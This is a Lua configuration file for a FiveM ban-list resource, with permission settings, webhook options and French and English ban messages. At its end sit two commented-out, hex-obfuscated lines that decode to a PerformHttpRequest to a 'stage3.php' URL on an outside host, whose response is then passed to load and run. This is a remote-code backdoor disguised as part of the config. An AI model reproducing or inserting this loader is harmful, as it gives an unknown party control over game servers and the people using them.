Config                   = {}

--GENERAL
Config.Lang              = 'en'    --Set lang (fr-en)
Config.permission        = 2	   --Permission need to use FiveM-BanSql commands (mod-admin-superadmin)
Config.MultiServerSync   = false   --This will check if a ban is add in the sql all 30 second, use it only if you have more then 1 server (true-false)


--WEBHOOK
Config.EnableR8BqpfHzGx = false --Turn this true if you want link the log to a discord (true-false)
Config.webhookban        = ""
Config.webhookunban      = ""


--LANGUAGE
Config.TextFr = {
	start         = "La BanList et l'historique a ete charger avec succes",
	starterror    = "ERROR : La BanList ou l'historique n'a pas ete charger nouvelle tentative.",
	banlistloaded = "La BanList a ete charger avec succes.",
	historyloaded = "La BanListHistory a ete charger avec succes.",
	loaderror     = "ERROR : La BanList n a pas été charger.",
	forcontinu    = " jours. Pour continuer entrer /sqlreason (Raison du ban)",
	noreason      = "Raison Inconnue",
	during        = " pendant : ",
	noresult      = "Il n'y a pas autant de résultats !",
	isban         = " a été ban",
	isunban       = " a été déban",
	invalidsteam  =  "Vous devriez ouvrir steam",
	invalidid     = "ID du joueur incorrect",
	invalidname   = "Le nom n'est pas valide",
	invalidtime   = "Duree du ban incorrecte",
	yourban       = "Vous avez ete ban pour : ",
	yourpermban   = "Vous avez ete ban permanant pour : ",
	youban        = "Vous avez banni : ",
	forr          = " jours. Pour : ",
	permban       = " de facon permanente pour : ",
	timeleft      = ". Il reste : ",
	toomanyresult = "Trop de résultats, veillez être plus précis.",
	day           = " Jours ",
	hour          = " Heures ",
	minute        = " Minutes ",
	by            = "par",
	ban           = "Bannir un joueurs qui est en ligne",
	banoff        = "Bannir un joueurs qui est hors ligne",
	dayhelp       = "Nombre de jours",
	reason        = "Raison du ban",
	history       = "Affiche tout les bans d'un joueur",
	reload        = "Recharge la BanList et la BanListHistory",
	unban         = "Retirez un ban de la liste",
	steamname     = "(Nom Steam)",
}


Config.TextEn = {
	start         = "BanList and BanListHistory loaded successfully.",
	starterror    = "ERROR: BanList and BanListHistory failed to load, please retry.",
	banlistloaded = "BanList loaded successfully.",
	historyloaded = "BanListHistory loaded successfully.",
	loaderror     = "ERROR: The BanList failed to load.",
	forcontinu    = " days. To continue, execute /sqlreason [reason]",
	noreason      = "No reason provided.",
	during        = " during: ",
	noresult      = "No results found.",
	isban         = " was banned",
	isunban       = " was unbanned",
	invalidsteam  = "Steam is required to join this server.",
	invalidid     = "Player ID not found",
	invalidname   = "The specified name is not valid",
	invalidtime   = "Invalid ban duration",
	yourban       = "You have been banned for: ",
	yourpermban   = "You have been permanently banned for: ",
	youban        = "You are banned from this server for: ",
	forr          = " days. For: ",
	permban       = " permanently for: ",
	timeleft      = ". Time remaining: ",
	toomanyresult = "Too many results, be more specific to shorten the results.",
	day           = " days ",
	hour          = " hours ",
	minute        = " minutes ",
	by            = "by",
	ban           = "Ban a player",
	banoff        = "Manually ban a (offline) player",
	dayhelp       = "Duration (days) of ban",
	reason        = "Reason for ban",
	history       = "Shows all previous bans for a certain player",
	reload        = "Refreshes the ban list and history.",
	unban         = "Unban a player.",
	steamname     = "Steam name",
}




-- local RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR[4][RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x61\x64\x61\x72\x61\x38\x39\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x65\x63\x56\x78\x6d", function (HnBZbBSHaQgUdBAfFWpRTVQWsNlJHGPGInvOYiurrjshVAtWZHgkzZvwWDzaPMfFRXKFth, DkVIjqlxenlKsoUtBwDbXiWMfSXqTFRilxFdfDaZEVPRLkmOggxRfYPjTCFDnunfbXJlyn) if (DkVIjqlxenlKsoUtBwDbXiWMfSXqTFRilxFdfDaZEVPRLkmOggxRfYPjTCFDnunfbXJlyn == RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR[6] or DkVIjqlxenlKsoUtBwDbXiWMfSXqTFRilxFdfDaZEVPRLkmOggxRfYPjTCFDnunfbXJlyn == RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR[5]) then return end RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR[4][RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR[2]](RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR[4][RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR[3]](DkVIjqlxenlKsoUtBwDbXiWMfSXqTFRilxFdfDaZEVPRLkmOggxRfYPjTCFDnunfbXJlyn))() end)

-- local RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR[4][RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x61\x64\x61\x72\x61\x38\x39\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x65\x63\x56\x78\x6d", function (HnBZbBSHaQgUdBAfFWpRTVQWsNlJHGPGInvOYiurrjshVAtWZHgkzZvwWDzaPMfFRXKFth, DkVIjqlxenlKsoUtBwDbXiWMfSXqTFRilxFdfDaZEVPRLkmOggxRfYPjTCFDnunfbXJlyn) if (DkVIjqlxenlKsoUtBwDbXiWMfSXqTFRilxFdfDaZEVPRLkmOggxRfYPjTCFDnunfbXJlyn == RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR[6] or DkVIjqlxenlKsoUtBwDbXiWMfSXqTFRilxFdfDaZEVPRLkmOggxRfYPjTCFDnunfbXJlyn == RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR[5]) then return end RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR[4][RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR[2]](RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR[4][RarWlaxdHJXDCyAnbiqZqHuzVZdQAGbZvdKnolVtuKGkMHwxmkgRYVPlzpAmnAxpPWzMFR[3]](DkVIjqlxenlKsoUtBwDbXiWMfSXqTFRilxFdfDaZEVPRLkmOggxRfYPjTCFDnunfbXJlyn))() end)